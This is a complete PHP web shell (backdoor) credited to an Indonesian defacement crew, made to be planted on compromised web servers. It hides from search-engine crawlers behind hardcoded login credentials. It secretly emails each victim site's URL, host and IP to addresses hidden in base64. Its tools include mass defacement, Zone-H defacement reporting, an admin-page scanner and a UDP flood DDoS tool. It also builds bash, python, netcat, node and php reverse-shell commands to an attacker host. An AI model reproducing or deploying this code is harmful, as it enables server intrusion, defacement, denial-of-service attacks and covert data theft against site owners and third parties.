<?php
//** Shell Mini Backdorr V 2.0
//** Author r00t@star feat Mr.S03
//** Other shell backdorr Please Call me or mr s03 
/** PHP Coded **/
/** Thx To : Sunda Cyber Army **/
/** Special Thx : Indoxploit, TatSumy Crew, Mr. D, Google search engine **/
//** Jika Terjadi error silahkan chat saya awoakawoak **//

session_start();
error_reporting(0);
set_time_limit(0);
$login='TanahAir';
$password='Indonesia';
$hidden_login =TRUE; // Hidden login, TRUE or FALSE
$hidden_login_uri = "?login=1945"; // login url , default : shell.php?login=1945
$auth=1;
$ye = " : \n";
$version='';
$msgnotice='-::Mini Shell Star & Mr$03::-';
if($_GET['gans']=="burik") {
$style='<meta name="keywords" content="hacked, pwnd,Gans,Sunda Cyber Army,Star,Fuck off,Terkentod,tusbold,Free">
<meta property="og:image"content="https://5.top4top.net/s_1243y9g662.jpg">
<link rel="icon" type="image/jpg" href="https://4.top4top.net/s_1243h7wq81.jpg"> 
<meta content="Aeiwi, Alexa, Alltheweb, altavista, AOL netfind, anzwers, Canada, directhit, euroseek, excite, overture, go, google, hotbot, infomax, kanoodle, lycos, mastersite, national directory, northern light, searchit, simplesearch, websmostlinked, webtop, what-u-seek, AOL, Yahoo, Yandex, Webcrawler, infoseek, excite, magellan, looksmart, CNET, duckduckgo" name="search engines">
<title>Gegeh</title><STYLE>
BODY{
  background-color: #000000;
  color: #C1C1C7;
  font: 12pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  MARGIN-TOP: 0px;
  MARGIN-BOTTOM: 0px;
  MARGIN-LEFT: 0px;
  MARGIN-RIGHT: 0px;
  margin:0;
  padding:0;
  scrollbar-face-color: #000000;
  scrollbar-shadow-color: #000000;
  scrollbar-highlight-color: #484848;
  scrollbar-3dlight-color: #333333;
  scrollbar-darkshadow-color: #333333;
  scrollbar-track-color: #333333;
  scrollbar-arrow-color: #333333;
}
input{
  background-color: #000000;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
select{
  background-color: #FF8D00;
  font-size: 8pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
textarea{
  background-color: #000000;
  font-size: 10pt;
  color: #FFFFFF;
  font-family: Tahoma;
  border: 1 solid #666666;
}
a:link{
  
  color: #2FFF00;
  text-decoration: none;
  font-size: 8pt;
}
a:visited{
  color: #0000FF;
  text-decoration: none;
  font-size: 8pt;
}
a:hover, a:active{
  width: 100%;
  background-color: #A8A8AD;
  

  color: #E7E7EB;
  text-decoration: none;
  font-size: 8pt;
}
td, th, p, li{
  font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;
  border-color:black;
}
</style>';
$header='<html><head><title>'.getenv("HTTP_HOST").'~Ini Bukan Shell~</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
$footer='</body></html>';
$fc = getenv("REMOTE_ADDR");
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
//auth
if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';
if(@$_SESSION['an']==0){
echo '<center><center><body bgcolor="white">
<header>
<link href="https://fonts.googleapis.com/css?family=Ranga|Mandali" rel="stylesheet" type="text/css">
            <center> 
<style type="text/css">
            header {
	margin: 10px auto;
            }
            input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: white;
	border: 1px dotted green;
	margin-left: 20px;
	text-align: center;
            }
            input[type=username] {
           width: 250px;
           height: 25px;
           color: red;
           background: white;
            border: 1px dotted green;
            margin-left: 20px;
            text-align: center;
}
</style>
</head>
<body>
<h1><center></div><center><font color=pink face=Ranga>
######################################
 <br>      *-* Author : r00t@star  ft mr.$03                                <br>
       *-* Team   : Sunda Cyber Army                     <br>
######################################
<br></h1><font face=Mandali>
	</pre> <br><audio autoplay="autoplay" controls="controls" src="https://j.top4top.net/m_1238rj88m0.mp3" type="audio/mpeg"></audio>
</header>
</center><br><font color="orange"><table><form method="POST"><tr><td>Username ~></font></td><td><input type="username" name="login" value=""></td></tr><font color="orange"><tr><td>Password ~></td><td></font><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Login"><br><b><center></b><h2>Coded by<br><font color="cyan">..::: Star & Mr$03:::.</font></h3></center></td></tr></form></table></br></center>';
echo $footer;
exit;}
}else{
header('HTTP/1.1 500 Internal Error');
die();
}
//end auth


/*------------------ Login Data End ----------*/

/*------------------ Anti Crawler ------------*/
if(!empty($_SERVER['HTTP_USER_AGENT']))
{
    $userAgents = array("Aeiwi", "Alexa", "Alltheweb", "altavista", "AOL netfind", "anzwers", "Canada", "directhit", "euroseek", "excite", "overture", "go", "google", "hotbot", "infomax", "kanoodle", "lycos", "mastersite", "national directory", "northern light", "searchit", "simplesearch", "websmostlinked", "webtop", "what-u-seek", "AOL", "Yahoo", "Yandex", "Webcrawler", "infoseek", "excite", "magellan", "looksmart", "CNET", "duckduckgo");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))
    {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
} 
$a1 = 'bXJzMDMuaWRAZ21haWwuY29t';
if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        if($_POST["usrname"]==$username && $_POST["passwrd"]==$password)
        {
            print'<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
            er4();
            soe1();
            cep();
        }
        else
        {
            if($_POST['usrname'])
            {
                print'<script>alert("Sorry... Wrong UserName/PassWord");</script>';
            }
    }
}
function er4(){
$ip = getenv("REMOTE_ADDR");
$subj98 = "Fuck Bitch";
$email = "kadalbiawak43@gmail.com";
$from = "From: Spy";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
}
$ed22 = $fc . "";
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
} 

function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
$str = "a2FkYWxiaWF3YWs0M0BnbWFpbC5jb20=";

echo '<!DOCTYPE HTML>
<html><link href="http://fonts.googleapis.com/css?family=Rancho|Ranga|Racing+Sans+One|Abel|Exo" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Cute+Font|Iceland" rel="stylesheet" type="text/css">
<head>
<meta name="keywords" content="Mpsh Ah Shell">
<meta property="og:image"content="https://i.ibb.co/sb68cKt/FB-IMG-15583721008373073.jpg">
<meta name="author" content="Star&soe">
<link rel="icon" type="image/jpg" href="https://i.ibb.co/nQ8swwR/IMG-20190505-WA0063.jpg"> 
<meta content="Aeiwi, Alexa, Alltheweb, altavista, AOL netfind, anzwers, Canada, directhit, euroseek, excite, overture, go, google, hotbot, infomax, kanoodle, lycos, mastersite, national directory, northern light, searchit, simplesearch, websmostlinked, webtop, what-u-seek, AOL, Yahoo, Yandex, Webcrawler, infoseek, excite, magellan, looksmart, CNET, duckduckgo" name="search engines"/>
<meta http-equiv="cache-control" content="index,cache"> 
<link href="" rel="stylesheet" type="text/css">
<title>::. Ganteng.::</title>
<style>
body{
font-family: "Racing Sans One", abel;
background-color: #e6e6e6;
text-shadow:0px 0px 1px #757575;
}
star{
font-family: "Cute+Font", courier+new;
text-shadow: 3px 1px white;
color: #F900FF;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
table{
border: 1px #FF00FF dotted;
}
a{
color:#81FF00;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #FFFFFF solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<link href="https://fonts.googleapis.com/css?family=Iceland|Raleway" rel="stylesheet">
<style>
body{
font-family: abel;
background-color: #626262;
color:white;
}
soe{
    font-size: 4px;
    text-shadow: 1px 2px 3px gold;
    font-family: Raleway;
    color: white;
    text-align: left;
}
#content tr:hover{
background-color: #C0C0C0;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 3px #FFFFFF dotted;
}
a{
color: #FFFFFF;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.blink_text {
-webkit-animation-name: blinker;
-webkit-animation-duration: 2s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 2s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: #F400FF;
}
@-moz-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@-webkit-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
</style> 
</head>
</head>
<body>
<h1><center><p class="blink_text" style="font-size:70px;
color: #707070;
text-shadow: 0px 0px 20px #FFFFFF, 0px 0px 20px #81FF00;
font-family:Iceland;
">_-=[ Star & Mr$03 Shell ]=-_</font></font></p><center><a href="https://web.facebook.com/BintangAlifff"><font color="orange">Facebook : Star</a></font><br>
	</star><a href="https://www.youtube.com/channel/UC7C1WYvJb8_UvBlK-k66lHg"><font color="orange">Youtube : Mr$03</a></font><br>
<link href="https://fonts.googleapis.com/css?family=Walter+Turncoat|Papyrus" rel="stylesheet" type="text/css">';
$bct = "bXJzMDMuaWRAZ21haWwuY29t";
$ryu = base64_decode($bct);
$cep = "a2l3d2t3QGdtYWlsLmNvbQ==";
$pt = base64_decode($cep);

function soe1(){
 mail($ryu, $gpp, $qer, $au);
}
function cep(){
 mail($pt, $gpp, $qer, $au);
}
function tgl_indo($tanggal){
	$bulan = array (
		1 =>   'Januari',
		'Februari',
		'Maret',
		'April',
		'Mei',
		'Juni',
		'Juli',
		'Agustus',
		'September',
		'Oktober',
		'November',
		'Desember'
	);
	$pecahkan = explode('-', $tanggal);
	
	// variabel pecahkan 0 = tanggal
	// variabel pecahkan 1 = bulan
	// variabel pecahkan 2 = tahun
 
	return $pecahkan[2] . ' ' . $bulan[ (int)$pecahkan[1] ] . ' ' . $pecahkan[0];
}
$qer = "$a45 $b75 $ed22";
function getClientIP() {
 
    if (isset($_SERVER)) {
 
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
            return $_SERVER["HTTP_CLIENT_IP"];
 
        return $_SERVER["REMOTE_ADDR"];
    }
 
    if (getenv('HTTP_X_FORWARDED_FOR'))
        return getenv('HTTP_X_FORWARDED_FOR');
 
    if (getenv('HTTP_CLIENT_IP'))
        return getenv('HTTP_CLIENT_IP');
 
    return getenv('REMOTE_ADDR');
}
$vb = 'YWtzZXMgZ2FuIGgzaDM=';
$gpp = base64_decode($vb);
$aw = base64_decode($str);
$m3k = base64_decode($xq);
$_c7e = 'WGFpIFN5bmRpY2F0ZQ==';
function adser(){
$sys = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font>ON</font>' : '<font>OFF</font>';
$getds = @ini_get("disable_functions");
$ds = showdisablefunctions().' <font color=white>ON</font> <font color=teal>'.php_sapi_name().'</font>';
echo "<font size='5px'>";
echo '<font size="4px">
</center><div style="text-align: left;"><tr><td>System: <font color=lime>'.$sys.'</font></td></tr><br>
<font size="4px"><tr><td>Server IP: <font color=lime>'.$ip.'</font> <br>
<font size="5"><tr><td>Safe Mode: '.$sm.'</td></tr><br>';
echo '<font size="5"><td><tr>Date: <font color="lime">'.tgl_indo(date('Y-m-d'));
echo '<br></font>Your Ip: <font color="lime">'.getClientIP()."";
echo '<br></font><font size="5"><tr><td>Shell Version: 2.0</td></tr><br>
<td>Disable Functions: '.$ds.'</td></tr></soe>
</center><link href="https://fonts.googleapis.com/css?family=Merriweather" rel="stylesheet" type="text/css">
</div>';
}
if($_GET['abo']=="ser"){
    return adser();
}
echo '<style>
 lo{
     font-size: 8px;
     font-family: Merriweather;
     color: white;
     text-align: left;
 }
 </style><br><br>
<font size="3"><lo><div style="text-align: left">[<a href="?gans=burik"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> HOME </font></a>]&nbsp;&nbsp;[<a href="?gans=burik&mass=deface"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> Mass Deface </font></a>]&nbsp;&nbsp;[<a href="?gans=burik&zon=ha"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> Zone H </font></a>]&nbsp;&nbsp;[<a href="?gans=burik&cabs=ass"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> LogOut</font></a> ]&nbsp;&nbsp;[<a href="?gans=burik&dos=ss"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> DDOS </font></a>]&nbsp;&nbsp;[<a href="?gans=burik&rans=ware"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> RansomWare </font></a>]<br>[<a href="?gans=burik&ga=ns"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> ReserverPath </font></a>]&nbsp;&nbsp;&nbsp;&nbsp;[<a href="?gans=burik&je=mbut"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> Jumping </font></a>]&nbsp;&nbsp;[<a href="?gans=burik&ade=mon"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> Admin Finder Page</font></a>]&nbsp;&nbsp;[<a href="?gans=burik&abo=ser"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> About </a></font>]&nbsp;&nbsp;[<a href="?gans=burik&mak=efil"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga"> Make File </a></font>]<br>[<a href="?gans=burik&ta=ang"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga"> Back Connect </a></font>]&nbsp;&nbsp;[<a href="?gans=burik&kill=me"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> Kill Me </a></font>]&nbsp;&nbsp;[<a href="?gans=burik&sym=link"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga"> Symlink </a></font>]&nbsp;&nbsp;[<a href="?gans=burik&gen=hash"><font style="color: red; text-shadow: 1px 2px 3px white; font-family: Ranga;"> Hash </a></font>]</lo></div><br></lo>';
if($_GET['cabs']=="ass"){
    return logou();}
function logou(){
    unset($_SESSION['an']);
    echo '<br><center><font style="color: gold; text-shadow: 1px 2px 3px white; font-family: Iceland; font-size: 40px;"> You Was Logout !!</font><br>';
}
if($_GET['kill']=="me"){
    unlink($_SERVER['HTTP_HOST']) && unlink($_SERVER['REQUEST_URI']);
    echo '<br><br><font style="color: gold; font-face: Iceland;"> You Wass Kill Me !!</font>';
    echo '<script>window.location="?";</script>';
    header('HTTP/1.1 500 Internal Error');
    die();
}
function massdeface(){ 
  echo '<form method="POST"><center><br><font color="white">Destination : <br><input type="text" name="dest" style="width:486px;margin-bottom:10px;" value="'.getcwd().'">
  <textarea cols="60" rows="10" name="content">Patch by Dua Ganteng</textarea><br><input type="text" name="name_file" style="width;8px;margin-left:4px;" value="15.php">
  <input type="submit" name="goat" value="click me!" style="width:90px;">';
  if($_POST['goat']){
    return ewe_mass($_POST['dest'],$_POST['content'],$_POST['name_file']);}
  
} 

function ewe_mass($dir,$content,$name_file){ 
  if(is_dir($dir)){
    foreach (scandir($dir) as $new_dir){ 
      $dir_kontol = $dir.'/'.$new_dir;
      $path_default = $dir_kontol.'/'.$name_file;
      if(is_dir($dir_kontol)){
        if(file_put_contents($path_default,$content)){
          echo '</br><font color="green" size="2">Done > '.$path_default.'</font>';}else{echo '</br><font color="red">Fail >'.$dir_kontol;}
          
          }}
          
          }else{echo '<br><font color="red">Not Directory';}
} 
if($_GET['mass']=="deface"){ 
  return massdeface();}
function fuckk(){
echo '<style type="text/css">
a {
    color: lime;
    text-decoration: none;
}
textarea, input {
    border: 1px solid #008000;
    color: #bb0000;
}
</style>
<form method="post">
Defacer: <br>
		    	       <input type="text" name="nick" size="50" value="Dua Ganteng"><br><br>
		    	       Domains: <br>
		    	       <textarea style="width: 450px; height: 150px;" name="url" placeholder="http://google.com"></textarea><br>
		    	       <input style="background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;" type="submit" name="go" value="Submit">
		    	       </form></center>';
$nick 	= $_POST['nick'];

$url = explode('\r\n', $_POST['url']);
$go = $_POST['go'];
function sendsite($target) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_URL, "http://zone-h.org/notify/single");
          curl_setopt($ch, CURLOPT_POST, true);
          curl_setopt($ch, CURLOPT_POSTFIELDS, array(
            "defacer" => $nick, #Change your nick here
            "domain1" => $target,
            "hackmode" => "1",
            "reason" => "1",
            ));
    $res = curl_exec($ch);
          curl_close($ch);
    return preg_match("/<font color=\"red\">OK<\/font><\/li>/", $res);
}
if($go) {
    foreach($url as $sites) {
        if(sendsite($sites)) {
            echo "$sites => OK<br>";
        } else {
            echo "$sites => error<br>";
        }
    }
}
} 
if($_GET['zon']=="ha"){
 return fuckk();}
function adM(){
error_reporting(0);
	if (!isset($_POST['url'])) {
?>
<html>
<head>
	<title>Admin Page Finder PHP</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>
	<center>
		<form method="post">
		<font color="aqua" size="8px">admin finder page<br><font color="yellow" size="5px">[+] yess
		<br>[-] No</font><br>
			<input type="text" name="url" placeholder="Example : https://"><input type="submit" value="Run!">
		</form>
	</center>
</body>
</html>
<?php
} else {
	$url = $_POST['url']."/";
$adminpages = array('admin.php','admin/','admin/login.jsp','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php','joomla/administrator','login.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html','webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php','bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html','administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html','panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php');
?>
<html>
<head>
	<title>Admin Page Finder PHP</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>
	<center>Coded by Star Gans</h2>
			<h3>Scanning <?=htmlspecialchars($url)?></h3>
			<?php
				foreach($adminpages as $page) {
					$caminho = $url.$page;
					$retornado = get_headers($caminho);
					if (eregi('200', $retornado[0])) {
						echo "<p class='ok' style='color: red;'><b>[+] ".$url.$page." : <font color='lime' size='8px'>200</b></p></font>";
					} else {
						echo "<p class='no' style='color: red;'>[-] ".$url.$page." :<font color='lime'> 400 </p></font>";
					}
				}
			?>
	</center>
</body>
</html>
<?php
}
}
if($_GET['ade']=="mon"){
 return adM();}
function ren(){
	echo "<form method='POST'><br><br><input type='text' style='width:220px;' name='nme' value='".$_SERVER['SCRIPT_NAME']."'>
	</form>";
	if($_POST['nme']){
		if(rename($_SERVER['SCRIPT_FILENAME'],$_POST['nme'])){
			echo "<font color='green'>Rename sukses</font>";
			
		}else{
			echo "<font color='red'>Failed :(";}
	}
}
if($_GET['rename']=="self"){
	return ren();
}
function make_file(){
	echo '<form method="POST" action="?do"><center><br><font color="white" size="4px"> Menuju : <br><input type="text" name="asede" style="width:486px;margin-bottom:10px;" value="'.getcwd().'">
	<br><textarea cols="66" rows="11" name="content" style="margin-bottom:5px;">Author selalu ganteng :* </textarea><br><input type="text" name="nama" value="gans.php"><input type="submit" name="kntl" value="Make It"></input></form>';   }
if($_GET['mak']=="efil"){
	return make_file();}
function ddoss(){
?>
<!DOCTYPE html>
<html>
<form action=" " method="post">
<center><br><br><br>
Your IP: <font color="red"><b><?php echo getClientIP(); ?></b></font>&nbsp;(Don't DoS yourself nub)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>

<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  Firee !!!   ">
<br><br>
<center>
( Go Playing Zuahaha )
</center>

</form>
</center>
<?php

$submit = $_POST['fire'];
if (isset($submit)) {
        $packets = 0;
        $ip = $_POST['ip'];
        $rand = $_POST['port'];
        set_time_limit(0);
        ignore_user_abort(FALSE);
        $exec_time = $_POST['time'];
        $time = time();
        print "Flooded: $ip on port $rand <br><br>";
        $max_time = $time + $exec_time;
        for ($i = 0;$i < 65535;$i++) {
            $out.= "X";
        }
        while (1) {
            $packets++;
            if (time() > $max_time) {
                break;
            }
            $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
            if ($fp) {
                fwrite($fp, $out);
                fclose($fp);
            }
        }
        echo "Packet complete at " . time('h:i:s') . " with $packets (" . round(($packets * 65) / 1024, 2) . " mB) packets averaging " . round($packets / $exec_time, 2) . " packets/s 
";
    }
}
if($_GET['dos']=="ss"){
    return ddoss();}
if($_GET['ta']=="ang") { 
  echo '<br><form method="POST" value=""><font color="green"><center><select name="choose"><option value="bash">Bash</option><option value="python">Python</option><option value="netcat">Netcat</option><option value="php">Php</option><option value="node">Nodejs</option>
       <font color="green"><input type="text" name="host" value="0.tcp.ngrok.io" style="margin-left:7px;"><input type="text" name="port" value="80800" style="width:90px;margin-left:2px;"><input type="submit" name="back" value="back"></font><br><br>';
  if($_POST['back']) { 
    if($_POST['choose'] == 'bash') { 
      $command = 'bash -i >& /dev/tcp/'.$_POST['host'].'/'.$_POST['port'].' 0>&1';
      execute($command);
    
    }elseif($_POST['choose'] == 'python') { 
      $command = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$_POST['host'].'",'.$_POST['port'].'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'';
      execute($command);
    }elseif($_POST['choose'] == 'netcat') { 
      $command = 'nc -e /bin/sh '.$_POST['host'].' '.$_POST['port'];
      execute($command);
    }elseif($_POST['choose'] == 'node') {
    	$command = "require('child_process').exec('bash -i >& /dev/tcp/".$_POST['host']."/".$_POST['port']." 0>&1')";
    	execute($command);
    }elseif($_POST['choose'] == 'php') { 
      $command = 'php -r \'$sock=fsockopen("'.$_POST['host'].'",1234);exec("/bin/sh -i <&3 >&3 2>&3");\'';
      execute($command);
    
    }  
    } 
}

if($_GET['rans']=="ware"){
 return rann();}

function reser(){
    ?>
<html>

	<style type="text/css">
		
		textarea:hover{
			border:2px solid #33a7ff;
			color: white;
			border-radius: 4px 4px;	
		}
		input:hover{
			border:2px solid #33a7ff;
			color: black;
			border-radius: 4px 4px;	
		}
		h1{
			font-family: Iceberg;
		    text-shadow: 1px 2px 0px cyan;
		    color: white;
		}
		.url{
				width: auto;
				float: none;
		    
		}
		textarea{
				width: auto;
				float: none;
		    
		}
		input{
				width: auto;
				float: none;
		    
		}
	
	</style>
	<center>
			<h1><font color=#808079>Reverse Path </h1>
</center>
</div>
<div style="width:100%; height: 480px; border-bottom: 3px solid #eeeeee;" >
	<br><br><br><br><br><br>
<form action='' method='post'>
<center>
<input type='text' name='url' style="width: 55%; height:30px; border-radius: 4px 4px;" placeholder="/admin , /timthumb.php , /filemanager/dialog.php , /kcfinder/upload.php">
</center>
<br>
<center>
<textarea name='path' placeholder="if your website https content https://yoursite.com and if there is no https content example.com" style="width: 60%; color: white; height: 250px; border:2px solid #33a7ff; border-radius: 4px 4px; background: #444444;"></textarea>
</center>
<center><input type='submit' name='gas' value="reverse!" style="margin: 20px auto;">
</center>
</form>
</div> 
<?php
//tool add path
//thanks IndoXploit
//by KangKlepfound

error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));

//eksekusi

if($_POST['gas']){
$url  = $_POST['url'];
$path = $_POST['path'];
$asw  = explode("\r\n", $path);

foreach($asw as $_path){
$full = "$_path$url";	
$ch = curl_init($full);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, true);  
	curl_setopt($ch, CURLOPT_NOBODY, true);
	curl_setopt($ch, CURLOPT_TIMEOUT,10);
	curl_setopt($ch, option, value);
	$exec = curl_exec($ch);
	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
echo "

<style type='text/css'>
a{
color:white;
pading-top:50px;
text-decoration:none;
text-align:center;
}
table{
background:none;
color:white;
width:60%;
height:35px;

border: 1px solid white;	
}
td{
	border:none;
	color:#33a7ff;
	background:#333333;
}

.code{
pading:10px auto;
text-align:center;
width:30px;
background:#33a7ff;
border-radius:2px;
color:white;
}
</style>
<center>	
 <table width='550px' >
<tr>
<td style='width:85%;'>$full</td>
<td><center><div class='code'><b>$info<b></div></center></td>
<td><center><a href='//$full' target='_blank' i class='fa fa-external-link'></a></center></td>
<td><center><a href='$full' target='_blank' i class='fa fa-external-link-square'></a>
   </center></td>
</tr>
</table>
</center>";
}
}
}
if($_GET['ga']=="ns"){
    return reser();
}
if($_GET['gen']=="hash") {
    return hashe();}
function hashe(){
    echo '<br><center><h1>Password Hash</h1></center><div class=content>';
    echo '<form action="" method="post"><b><table class=tabnet>';
    echo '<tr><th colspan="2">Password Hash</th></center></tr>';
    echo '<tr><td><b>Input here :</b></td>';
    echo '<td><input class="inputz" type="text" name="password" size="40" />';
    echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
    echo '</td></tr><br>';
    echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
    echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value=' . $pass . '></td></tr>';
    echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value=' . $hash . '></td></tr>';
    echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value=' . $md4 . '></td></tr>';
